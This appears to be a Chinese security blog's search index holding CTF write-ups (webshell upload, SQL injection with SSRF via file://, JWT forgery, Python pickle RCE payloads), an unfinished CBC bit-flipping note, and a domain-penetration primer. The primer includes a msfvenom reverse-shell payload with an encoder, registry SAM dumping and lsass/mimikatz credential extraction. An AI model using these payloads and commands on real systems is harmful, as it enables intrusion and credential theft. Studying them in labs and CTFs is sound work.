<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>sics-07 wp</title>
    <url>/2020/06/04/sics-07/</url>
    <content><![CDATA[<h1 id><a href="#" class="headerlink" title=" "></a> </h1><p>找到一个可以点开的地方<br><img src="/2020/06/04/sics-07/01.png" alt="timu"></p>
<p>顺便给了一段源码,主要分为三部分</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">session_start();</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>($_GET[page])) &#123;</span><br><span class="line">  show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">  <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[page]) &amp;&amp; $_GET[page] != <span class="string">'index.php'</span>) &#123;</span><br><span class="line">  <span class="keyword">include</span>(<span class="string">'flag.php'</span>);</span><br><span class="line">&#125;<span class="keyword">else</span> &#123;</span><br><span class="line">  header(<span class="string">'Location: ?page=flag.php'</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>这一部分没什么用,主要看后面两段</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> <span class="keyword">if</span> ($_SESSION[<span class="string">'admin'</span>]) &#123;</span><br><span class="line">   $con = $_POST[<span class="string">'con'</span>];</span><br><span class="line">   $file = $_POST[<span class="string">'file'</span>];</span><br><span class="line">   $filename = <span class="string">"backup/"</span>.$file;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">if</span>(preg_match(<span class="string">'/.+\.ph(p[3457]?|t|tml)$/i'</span>, $filename))&#123;</span><br><span class="line">      <span class="keyword">die</span>(<span class="string">"Bad file extension"</span>);</span><br><span class="line">   &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        chdir(<span class="string">'uploaded'</span>);</span><br><span class="line">       $f = fopen($filename, <span class="string">'w'</span>);</span><br><span class="line">       fwrite($f, $con);</span><br><span class="line">       fclose($f);</span><br><span class="line">   &#125;</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>发现可以写入<code>webshell</code>,对文件名做了正则,但可以用<code>shell.php/xxxx/..</code>或者<code>shell.php/.</code>原理都一样,只会匹配最后的<code>.</code>，但前提是需要一个<code>admin</code>的<code>session</code>。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[id]) &amp;&amp; floatval($_GET[id]) !== <span class="string">'1'</span> &amp;&amp; substr($_GET[id], <span class="number">-1</span>) === <span class="string">'9'</span>) &#123;</span><br><span class="line">    <span class="keyword">include</span> <span class="string">'config.php'</span>;</span><br><span class="line">    $id = mysql_real_escape_string($_GET[id]);</span><br><span class="line">    $sql=<span class="string">"select * from cetc007.user where id='$id'"</span>;</span><br><span class="line">    $result = mysql_query($sql);</span><br><span class="line">    $result = mysql_fetch_object($result);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    $result = <span class="keyword">False</span>;</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(!$result)<span class="keyword">die</span>(<span class="string">"&lt;br &gt;something wae wrong ! &lt;br&gt;"</span>);</span><br><span class="line">  <span class="keyword">if</span>($result)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"id: "</span>.$result-&gt;id.<span class="string">"&lt;/br&gt;"</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"name:"</span>.$result-&gt;user.<span class="string">"&lt;/br&gt;"</span>;</span><br><span class="line">    $_SESSION[<span class="string">'admin'</span>] = <span class="keyword">True</span>;</span><br><span class="line">  &#125;</span><br><span class="line"> <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>这里可以获取到<code>admin</code>的<code>session</code>，通过传入一个<code>id</code>,末尾是<code>9</code>但浮点数不为<code>1</code>,可以使用<code>1x9</code>或者<code>1-9</code>等等等，尽量查前面的数据。<br><img src="/2020/06/04/sics-07/03.png" alt="timu"><br>用<code>蚁剑</code>连接完事。<br><img src="/2020/06/04/sics-07/04.png" alt="timu"></p>
]]></content>
      <tags>
        <tag>代码审计</tag>
        <tag>php弱类型</tag>
        <tag>文件上传</tag>
      </tags>
  </entry>
  <entry>
    <title>fakeblog WP</title>
    <url>/2020/06/03/fakeblog/</url>
    <content><![CDATA[<p>看上去像是一个分享博客的网站，可添加博客地址，我直接添加一条数据</p>
<p><img src="/2020/06/03/fakeblog/01.png" alt="01"></p>
<p>点击用户名可查看详情<br><img src="/2020/06/03/fakeblog/02.png" alt="02"></p>
<p>在<code>url</code>后面加一个引号发现输出了报错信息，<code>no</code>参数可能存在注入<br><img src="/2020/06/03/fakeblog/03.png" alt="03"></p>
<p>可以报错注入，但注意貌似处理了<code>0x</code><br><img src="/2020/06/03/fakeblog/04.png" alt="04"></p>
<p>试了一下<code>union select</code>,提示警告，使用<code>union/**/select</code>可绕过,然后就走一般流程获取表名、列名，这里共四列，<code>2</code>位置可以显示数据，测试一下，权限不够不能写入<code>webshell</code><br><img src="/2020/06/03/fakeblog/05.png" alt="05"><br><img src="/2020/06/03/fakeblog/06.png" alt="06"><br><img src="/2020/06/03/fakeblog/07.png" alt="07"></p>
<p>有个<code>data</code>,查看一下发现是<code>php</code>序列化的字符串,其中<code>blog</code>的值就是添加数据时输入的<code>URL</code><br><img src="/2020/06/03/fakeblog/08.png" alt="08"><br>结合题目分析，后台可能去访问博客地址了并将内容返回,这样的话就可能存在<code>SSRF</code>。<br><img src="/2020/06/03/fakeblog/09.png" alt="09"><br>同时发现<code>robots.txt</code>中泄露了敏感文件,内容是<code>UserInfo</code>类</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UserInfo</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $name = <span class="string">""</span>;</span><br><span class="line">    <span class="keyword">public</span> $age = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">public</span> $blog = <span class="string">""</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($name, $age, $blog)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;name = $name;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;age = (int)$age;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;blog = $blog;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get</span><span class="params">($url)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $ch = curl_init();</span><br><span class="line"></span><br><span class="line">        curl_setopt($ch, CURLOPT_URL, $url);</span><br><span class="line">        curl_setopt($ch, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line">        $output = curl_exec($ch);</span><br><span class="line">        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);</span><br><span class="line">        <span class="keyword">if</span>($httpCode == <span class="number">404</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">404</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        curl_close($ch);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> $output;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getBlogContents</span> <span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;get(<span class="keyword">$this</span>-&gt;blog);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">isValidBlog</span> <span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $blog = <span class="keyword">$this</span>-&gt;blog;</span><br><span class="line">        <span class="keyword">return</span> preg_match(<span class="string">"/^(((http(s?))\:\/\/)?)([0-9a-zA-Z\-]+\.)+[a-zA-Z]&#123;2,6&#125;(\:[0-9]+)?(\/\S*)?$/i"</span>, $blog);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>重点关注<code>get</code>方法,其中将访问博客地址，页面<code>404</code>就返回<code>404</code>，有内容就返回内容。这点和猜测的一样,直接构造<code>Payload</code>利用<code>file://</code>将博客地址指定后台的本地文件。使用<code>union select</code>传递<code>payload</code>,这里<code>data</code>字段在第四个,先尝试读取<code>/var/www/html/flag.txt</code>失败,而<code>/var/www/html/flag.php</code>中可直接读取到<code>flag</code>。</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">http://220.249.52.133:31745/view.php?no=0 union/**/select 1,(select data from users),3,'O:8:"UserInfo":3:&#123;s:4:"name";s:4:"la2y";s:3:"age";i:18;s:4:"blog";s:29:"file:///var/www/html/flag.php";&#125; '</span><br></pre></td></tr></table></figure>
<p>反序列化正常，页面没有报错信息，此时查看下方的博客内容部分的源码即可。<br><img src="/2020/06/03/fakeblog/10.png" alt="10"></p>
<p><img src="/2020/06/03/fakeblog/11.png" alt="11"></p>
<p>由于没有过滤<code>load_file</code>，也可以直接使用<code>load_file</code>读取文件。</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">http://220.249.52.133:31745/view.php?no=0 union/**/select 1,(select load_file('/var/www/html/flag.php')),3,4</span><br></pre></td></tr></table></figure>]]></content>
      <tags>
        <tag>反序列化</tag>
        <tag>SSRF</tag>
        <tag>sqli</tag>
      </tags>
  </entry>
  <entry>
    <title>CISCN 2019-Bilibili WP</title>
    <url>/2020/06/02/bilibili/</url>
    <content><![CDATA[<p>这一题主要考察<code>JWT</code>的伪造以及<code>Pikle</code>反序列化</p>
<h1 id="Part-1"><a href="#Part-1" class="headerlink" title="Part 1"></a>Part 1</h1><p>  打开题目，居然觉得有点怀念，互联网时代的时间过得就是快，kunkun的梗好像都已经过了很久了。<br>  页面下方是一堆B站低级账号，看样子是要拿下六级号?<br><img src="/2020/06/02/bilibili/main.png" alt="main"><br>随便注册一个账号，默认有1000余额<br><img src="/2020/06/02/bilibili/home.png" alt="home"><br>那些去找目标商品—-六级号，翻了好几页都没影，估计是个坑，写脚本来找</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url=<span class="string">"http://220.249.52.134:55687/shop?page="</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">3</span>,<span class="number">10000</span>):</span><br><span class="line">    r=requests.get(url+str(i))</span><br><span class="line">    <span class="keyword">if</span> <span class="string">"lv6.png"</span> <span class="keyword">in</span> r.text:</span><br><span class="line">        print(<span class="string">"[+]"</span>+url+str(i))</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
<p>执行结果:<br><img src="/2020/06/02/bilibili/res.png" alt="lv6"></p>
<p>不得不说,这个lv6有点贵</p>
<p><img src="/2020/06/02/bilibili/lv6.png" alt="lv6"></p>
<p>点击购买,BP抓包发现有个折扣，直接修改后send</p>
<p><img src="/2020/06/02/bilibili/count.png" alt="lv6"></p>
<p>发现<code>/b1g_m4mber</code>,访问一下提示没有权限<br><img src="/2020/06/02/bilibili/big_member.png" alt="lv6"></p>
<h1 id="part-2-JWT伪造"><a href="#part-2-JWT伪造" class="headerlink" title="part 2 JWT伪造"></a>part 2 JWT伪造</h1><p>,请求里有<code>JWT</code>,可能是突破口，直接上<code>c-jwt-cracker</code>破解密钥试试<br><img src="/2020/06/02/bilibili/key.png" alt="jwt"></p>
<p>密钥是<code>1kUN</code>,emmmm</p>
<p>接着就去可以伪造<code>JWT</code>继续请求需要权限的页面了，</p>
<p><img src="/2020/06/02/bilibili/jwt.io.png" alt="lv6"></p>
<p><img src="/2020/06/02/bilibili/dahuiyuan.png" alt="lv6"><br>能成功访问<code>/b1g_m4mber</code>,同时给了网站源码</p>
<p><img src="/2020/06/02/bilibili/yuanma.png" alt="lv6"></p>
<h1 id="Part-3-pickle反序列化利用"><a href="#Part-3-pickle反序列化利用" class="headerlink" title="Part 3 pickle反序列化利用"></a>Part 3 pickle反序列化利用</h1><p>通过代码审计，<code>Admin.py</code> 下存在<code>pickle</code> 的反序列化</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">@tornado.web.authenticated</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">post</span><span class="params">(self, *args, **kwargs)</span>:</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        become = self.get_argument(<span class="string">'become'</span>)</span><br><span class="line">        p = pickle.loads(urllib.unquote(become))</span><br><span class="line">        <span class="keyword">return</span> self.render(<span class="string">'form.html'</span>, res=p, member=<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> self.render(<span class="string">'form.html'</span>, res=<span class="string">'This is Black Technology!'</span>, member=<span class="number">0</span>)</span><br></pre></td></tr></table></figure>
<p>和<code>php</code>反序列化一样,<code>pickle</code>反序列化时也可能会执行一些魔术方法，而<code>__reduce__</code>则相当于<code>__wakeup__</code>,在反序列化时自定调用。</p>
<p>构造payload执行命令就行,先查看根目录文件，<br><code>Payload</code>如下</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">payload</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__reduce__</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> (os.listdir,(<span class="string">'/'</span>,))   </span><br><span class="line"> </span><br><span class="line">p = pickle.dumps(payload())</span><br><span class="line">p = urllib.quote(p)</span><br><span class="line"><span class="keyword">print</span> p</span><br></pre></td></tr></table></figure>
<p>这里记录一下另一种写法<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">return</span> (eval,(<span class="string">"__import__('os').popen('ls').read()"</span>,))</span><br></pre></td></tr></table></figure><br>可能是版本问题，我本地<code>Python2</code>环境生成的<code>payload</code>有误，用的菜鸟的在线工具执行的<br><img src="/2020/06/02/bilibili/py1.png" alt="lv6"></p>
<p>根据源码向<code>/b1g_m4mber</code> <code>post</code>一个键为<code>become</code>值为上面的<code>payload</code>的数据</p>
<p><img src="/2020/06/02/bilibili/list.png" alt="list"></p>
<p>成功执行<code>__reduce__</code>,接着修改<code>Payload</code>读取<code>flag.txt</code><br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">payload</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__reduce__</span><span class="params">(self)</span>:</span></span><br><span class="line">       	<span class="keyword">return</span> (eval, (<span class="string">"open('/flag.txt').read()"</span>,))</span><br><span class="line"> </span><br><span class="line">p = pickle.dumps(payload())</span><br><span class="line">p = urllib.quote(p)</span><br><span class="line"><span class="keyword">print</span> p</span><br></pre></td></tr></table></figure></p>
<p>重新生成<code>Payload</code>，替换<code>become</code>的值即可拿到<code>flag</code></p>
<p><img src="/2020/06/02/bilibili/flag.png" alt="flag"></p>
]]></content>
      <tags>
        <tag>python</tag>
        <tag>反序列化</tag>
        <tag>JWT</tag>
      </tags>
  </entry>
  <entry>
    <title>分组密码中的字节翻转攻击</title>
    <url>/2019/12/07/AES-BYTEREV/</url>
    <content><![CDATA[<h1 id="Part-1-简介"><a href="#Part-1-简介" class="headerlink" title="Part 1 简介"></a>Part 1 简介</h1><p>在密码学中，分组加密（英语：Block cipher），又称分块加密或块密码，是一种对称密钥算法。它将明文分成多个等长的模块（block），使用确定的算法和对称密钥对每组分别加密解密。分组加密是极其重要的加密协议组成，其中典型的如DES和AES作为美国政府核定的标准加密算法，应用领域从电子邮件加密到银行交易转帐，非常广泛。</p>
<p>字节翻转</p>
<h1 id="Part-2-CBC模式"><a href="#Part-2-CBC模式" class="headerlink" title="Part 2 CBC模式"></a>Part 2 CBC模式</h1><h2 id="工作流程"><a href="#工作流程" class="headerlink" title="工作流程"></a>工作流程</h2><h3 id="加密流程"><a href="#加密流程" class="headerlink" title="加密流程"></a>加密流程</h3><p><img src="/2019/12/07/AES-BYTEREV/cbc1.png" alt="cbc1"></p>
<p>每个<code>明文分组</code>和上一组<code>密文分组</code>(第一组明文对应初始化向量<code>IV</code>)异或后加密后得到当前组的<code>密文分组</code>。</p>
<p>若用公式表示,<code>i</code>代表第<code>i</code>个分组,<code>c</code>代表密文,<code>m</code>代表明文,<code>iv</code>代表初始化向量,<code>E</code>代表加密</p>
<script type="math/tex; mode=display">C_i=E(xor(M_i,C_{i-1})  \ i>1</script><script type="math/tex; mode=display">C_0=IV</script><h3 id="解密流程"><a href="#解密流程" class="headerlink" title="解密流程"></a>解密流程</h3><p><img src="/2019/12/07/AES-BYTEREV/cbc2.png" alt="cbc2"></p>
<p>若用公式表示,<code>i</code>代表第<code>i</code>个分组,<code>c</code>代表密文,<code>m</code>代表明文,<code>iv</code>代表初始化向量,<code>D</code>代表解密</p>
<script type="math/tex; mode=display">M_i=xor(D(C_i),C_{i-1}) \ i>1</script><script type="math/tex; mode=display">C_0=IV</script><h2 id="攻击分析"><a href="#攻击分析" class="headerlink" title="攻击分析"></a>攻击分析</h2><p>由上面的原理可以发现,我们改变某一个<code>密文分组</code>,会影响到下一个解密出的<code>明文分组</code></p>
<script type="math/tex; mode=display">xor(C_{i-1},E(c_{i}))=M_i</script><p>如果</p>
<script type="math/tex; mode=display">C_{i-1}=xor(xor(C_{i-1},M_i),m)</script><p>m 为想篡改的内容</p>
<p>解密时,</p>
<script type="math/tex; mode=display">M_i=xor(xor(xor(C_{i-1},M_i),m),E(c_{i}))</script><script type="math/tex; mode=display">M_i=xor(xor(E(C_i),m),E(c_{i}))</script><script type="math/tex; mode=display">M_i=m</script><p>隔了几个月，先鸽了</p>
]]></content>
      <tags>
        <tag>crypto</tag>
      </tags>
  </entry>
  <entry>
    <title>域渗透入门</title>
    <url>/2019/12/03/domain/</url>
    <content><![CDATA[<h1 id="Part-1-相关概念"><a href="#Part-1-相关概念" class="headerlink" title="Part 1 相关概念"></a>Part 1 相关概念</h1><h2 id="域"><a href="#域" class="headerlink" title="域"></a>域</h2><p><code>域(domain)</code>是<code>Windows</code>中独立运行的单位,将网络中多台计算机逻辑上组织到一起,进行集中管理,这种区别于工作组的逻辑环境叫做域<br>域已经成为绝大多数公司组织、连接电脑的一种方式。假设你是公司的系统管理员,你们公司有几千上万台电脑,如果你要为每台电脑设置登录帐户,设置权限(比如是否允许登录帐户安装软件),那你要分别坐在这一十台电脑前工作,如果你要做一些改变,你也要分别在这一十台电脑上修改。相信没有哪个管理员愚要用这种不吃不喝不睡觉的方式来工作,所以就应运而生了域的概念。</p>
<h2 id="活动目录-ActiveDirectory"><a href="#活动目录-ActiveDirectory" class="headerlink" title="活动目录(ActiveDirectory)"></a>活动目录(ActiveDirectory)</h2><p><code>ActiveDirectory</code>存储了有关网络对象的信息,并且让管理员和用户能够轻松地查找和使用这些信息。对象可以是用户,组群,电脑,网域控制站,邮件,配置文件,组织单元,树系等。</p>
<h2 id="域控-域控制器"><a href="#域控-域控制器" class="headerlink" title="域控(域控制器)"></a>域控(域控制器)</h2><p>在一个机器装上活动目录以后这个机器就会被称作域控。在<code>Windows</code>的域中,不使用主域控制器与备份域控制器,每个域控制器充当的都是一样的角色,比如你有三个域控制器,你可以在任何一个域控制器上对用户的权限进行修改,你的修改将被复制到其他两个域控制器中。同样,如果一个域控制器发生故障,只要其他的域控制器还能正常工作,整个域还是可以正常运行</p>
<h2 id="域用户"><a href="#域用户" class="headerlink" title="域用户"></a>域用户</h2><p>用户名和密码到域控制器去验证,也就是说你的账号密码可以在同一域的任何一台计算机登录。</p>
<h2 id="域管-域管理员"><a href="#域管-域管理员" class="headerlink" title="域管(域管理员)"></a>域管(域管理员)</h2><p>高权限的域用户</p>
<p>登录到域控制器上,对一切权限进行控制,而不用跑到每台电脑前进行设置了。</p>
<h2 id="组"><a href="#组" class="headerlink" title="组"></a>组</h2><p>公司很多员工的权限都是相同的,那我们可不可以对这些相同的权限只设置一次,然后将该权限分配给相关的员工呢?答案就是使用分组(Group)。将不同的用户放入不同的分组里,然后对组进行权限设置,这样就免去了我们要对每个用户进行设置的麻烦。</p>
<h2 id="信任域"><a href="#信任域" class="headerlink" title="信任域"></a>信任域</h2><p>在很多的实际情况中,一个公司又有下面的子公司,所以就造成母公司有一个域,而子公司也有一个单独的域。母公司的域与子公司的域如何联系起来呢?我们可以在它们之间建立一种咤信任(Trust)的关系。如果母公司的帐户意要能够登录到子公司的域中,子公司的域就要对母公司的域建立信任关系。当母公司域的帐户想要登录到子公司域中时,子公司域由于信任母公司的域,所以它会听从从母公司域的域控制器返回的<code>accesskey</code>。反过来,由于母公司的域没有建立对子公司的信任,所以如果子公司的帐户想要登录到母公司的域中是不可能的。<br><code>/domain_trusts</code>返回受信任域的列表</p>
<h1 id="Part-2-域信息收集"><a href="#Part-2-域信息收集" class="headerlink" title="Part 2 域信息收集"></a>Part 2 域信息收集</h1><h2 id="nltest"><a href="#nltest" class="headerlink" title="nltest"></a>nltest</h2><p>信任域:可以在工作组里查询,查询内网里是否有域环境</p>
<figure class="highlight dos"><table><tr><td class="code"><pre><span class="line">nltest /domain_trusts /all_trusts/v/server:<span class="number">192</span>.<span class="number">168</span>.<span class="number">52</span>.<span class="number">2</span></span><br></pre></td></tr></table></figure>
<p><code>192.168.52.2</code>是域控<code>IP</code>,一般是<code>DNS</code>服务器<code>IP</code><br>返回所有信任<code>192.168.2.252</code>的域,<code>nltest</code>的命令:</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">nltest/dsgetdc:XXXXXX/server:<span class="number">192</span>.<span class="number">168</span>.<span class="number">52</span>.<span class="number">2</span></span><br></pre></td></tr></table></figure>
<p>返回域控和其相应的 IP 地址,XXXXXX 是上步骤结果中的一个域</p>
<p>nltest 其他参数看这里=》 <a href="https://www.cnblogs.comy/dreamer-fish/p/3473895.html" target="_blank" rel="noopener">https://www.cnblogs.comy/dreamer-fish/p/3473895.html</a></p>
<h2 id="csvde"><a href="#csvde" class="headerlink" title="csvde"></a>csvde</h2><p><code>Csvde</code>是<code>Windows Server2008</code>的内置命令行工具,位于<code>%windir%/system32</code>文件夹中。如果您安装了<code>AD DS</code>或<code>ActiveDirectory轻型目录服务(AD LDS)服务器角色</code>,则此功能可用。</p>
<p>适用于:<br><code>Windows Server2003</code>,<code>WindowsServer2008</code>,<code>WindowsServer2003R2</code>,<code>WindowsServer2008R2</code>,<code>WindowsServer2012,</code>带有<code>SP1</code>,<code>Windows8的WindowsServer2003</code></p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">csvde -setspn domainname -f c:\windows\temp\hack.csv</span><br></pre></td></tr></table></figure>
<p>LDAP 的存储规则</p>
<p>区分名(DN,Distinguished Name)一个条目的区分名称叫做“dn“或者叫做区分名。在一个目录中这个名称总是唯一的。<br>CN=CommonName 为用户名或服务器名,最长可以到 80 个字符,可以为中文;</p>
<p>OU=OrganizationUnit 为组织单元,最多可以有四级,每级最长 32 个字符,可以为中文;</p>
<p>O=Organization 为组织名,可以 3 一 64 个字符长</p>
<p>C=Country 为国家名,可选,为 2 个字符长<br><img src="/2019/12/03/domain/LDAP.png" alt="LDAP"></p>
<h2 id="setspn"><a href="#setspn" class="headerlink" title="setspn"></a>setspn</h2><p>命令</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">setspn -T domamin- Q */*</span><br></pre></td></tr></table></figure>
<p>SPN 官方名称即“服务主体名称“,本质上存的就是域内各种服务资源<br>的对应关系</p>
<p>如,对应的服务类型是什么,机器名是多少,服务端口是多少</p>
<p>借助 SPN 快速定位当前目标域中所有存活的各类服务器</p>
<h2 id="DNSDump"><a href="#DNSDump" class="headerlink" title="DNSDump"></a>DNSDump</h2><p>命令</p>
<figure class="highlight dos"><table><tr><td class="code"><pre><span class="line">dnsdump.exe -u 域名\域用户 -p 域密码 域控机器名</span><br></pre></td></tr></table></figure>
<p><img src="/2019/12/03/domain/dnsdump1.png" alt="dnsbump"></p>
<h2 id="net"><a href="#net" class="headerlink" title="net"></a>net</h2><figure class="highlight dos"><table><tr><td class="code"><pre><span class="line"><span class="built_in">net</span> user /domain                       获取域用户列表</span><br><span class="line"><span class="built_in">net</span> group "domain admins" /domain      获取域管理员列表</span><br><span class="line"><span class="built_in">net</span> group "domain controllers" /domain 查看域控制器</span><br><span class="line"><span class="built_in">net</span> group "domain computers" /domain   查看与机器</span><br><span class="line"><span class="built_in">net</span> group /domain                      查询域里面的组</span><br><span class="line"><span class="built_in">net</span> view                               查看同一域内机器列表</span><br><span class="line"><span class="built_in">net</span> view \\ip                          查看某IP共享</span><br><span class="line"><span class="built_in">net</span> view \\GHQ                         查看GHQ计算机的共享资源列表</span><br><span class="line"><span class="built_in">net</span> view /domain                       查看内网存在多少个域</span><br><span class="line"><span class="built_in">net</span> view /domain:XYZ                   查看XYZ域中的机器列表</span><br></pre></td></tr></table></figure>
<p><img src="/2019/12/03/domain/net1.png" alt="net"></p>
<h2 id="2-6-nbtscan"><a href="#2-6-nbtscan" class="headerlink" title="2.6 nbtscan"></a>2.6 nbtscan</h2><figure class="highlight dos"><table><tr><td class="code"><pre><span class="line">nbtscan.exe ip段</span><br></pre></td></tr></table></figure>
<p>有<code>DC</code>标识的主机即为<code>域控</code><br><img src="/2019/12/03/domain/nbtscan1.png" alt="nbtscan"></p>
<h1 id="Part-3-域渗透思路"><a href="#Part-3-域渗透思路" class="headerlink" title="Part 3 域渗透思路"></a>Part 3 域渗透思路</h1><h2 id="整体思路"><a href="#整体思路" class="headerlink" title="整体思路"></a>整体思路</h2><p>横向渗透-&gt;权限维持-&gt;获取一个域用户的账号密码-&gt;域信息收集-&gt;横向渗透-&gt;获取密码-&gt;获取域管权限-&gt;拿下域控服务器</p>
<h2 id="横向渗透思路"><a href="#横向渗透思路" class="headerlink" title="横向渗透思路"></a>横向渗透思路</h2><p>使用于工作组和域渗透<br><img src="/2019/12/03/domain/silu1.png" alt="silu"></p>
<h2 id="权限维持"><a href="#权限维持" class="headerlink" title="权限维持"></a>权限维持</h2><p><code>dll</code>加载<code>shellcode</code>免杀</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">msfvenom -a x86--platform Windows -p windows/meterpreter/reverse_tcp_uuid LPORT=9999 LHOST=192.168.1.1 -e</span><br><span class="line">x86/shikata_ga_nai -i 11 -f c -o shellcode.c</span><br><span class="line"></span><br><span class="line"><span class="meta">msf&gt;</span><span class="bash">use exploit/multi/handler</span></span><br><span class="line"></span><br><span class="line"><span class="meta">msf&gt;</span><span class="bash"><span class="built_in">set</span> payload windows/meterpreter/reverse_tcp_uuid</span></span><br><span class="line"></span><br><span class="line"><span class="meta">msf&gt;</span><span class="bash"><span class="built_in">set</span> lhost 192.168.1.1</span></span><br><span class="line"></span><br><span class="line"><span class="meta">msf&gt;</span><span class="bash"><span class="built_in">set</span> lport 9999</span></span><br><span class="line"></span><br><span class="line"><span class="meta">msf&gt;</span><span class="bash"><span class="built_in">set</span> EnableStageEncoding <span class="literal">true</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">msf&gt;</span><span class="bash"><span class="built_in">set</span> StageEncoder x86/fnsteny_mov</span></span><br><span class="line"></span><br><span class="line"><span class="meta">msf&gt;</span><span class="bash">exploit</span></span><br></pre></td></tr></table></figure>
<h2 id="注册表读取密码"><a href="#注册表读取密码" class="headerlink" title="注册表读取密码"></a>注册表读取密码</h2><h3 id="mimikatz"><a href="#mimikatz" class="headerlink" title="mimikatz"></a>mimikatz</h3><p>导出 <code>HKLM\SYSTEM</code>和<code>\HKLM\SAM</code>后用<code>mimakatz</code>解密</p>
<figure class="highlight d"><table><tr><td class="code"><pre><span class="line">reg save HKLM\SYSTEM</span><br><span class="line">c:\windows\temp\Sys.hiv</span><br><span class="line">reg save HKLM\SAM</span><br><span class="line">c:\windows\temp\Sam.hiv</span><br><span class="line"></span><br><span class="line"><span class="comment">//mimakatz 解密</span></span><br><span class="line">lsadump::sam /sam:Sam.hiv /system:Sys.hiv</span><br></pre></td></tr></table></figure>
<h3 id="Isass-读取密码"><a href="#Isass-读取密码" class="headerlink" title="Isass 读取密码"></a>Isass 读取密码</h3><p>// 在目标主机执行<code>procdump.exe</code></p>
<pre><code>procdump.exe -accepteula -ma lsass.exe lsass.dmp
</code></pre><p>//在<code>mimikatz</code>中运行,结果保存在日志里</p>
<pre><code>mimikatz.exe &quot;sekurlsa::minidump lsass.dmp&quot; &quot;log&quot; &quot;sekurlsa::logonpasswords&quot;
